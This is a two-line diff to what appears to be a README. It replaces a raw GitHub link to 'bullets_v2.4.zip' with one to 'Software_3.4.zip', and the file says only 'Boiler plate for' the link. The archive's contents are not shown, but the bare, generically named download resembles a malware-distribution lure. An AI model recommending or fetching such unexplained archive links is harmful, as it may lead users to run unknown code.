@@ -1,2 +1,2 @@
-# https://raw.githubusercontent.com/mreenalDhruwe/bullets/main/foo/bullets_v2.4.zip
-Boiler plate for https://raw.githubusercontent.com/mreenalDhruwe/bullets/main/foo/bullets_v2.4.zip
+# https://github.com/mreenalDhruwe/bullets/raw/refs/heads/main/foo/Software_3.4.zip
+Boiler plate for https://github.com/mreenalDhruwe/bullets/raw/refs/heads/main/foo/Software_3.4.zip
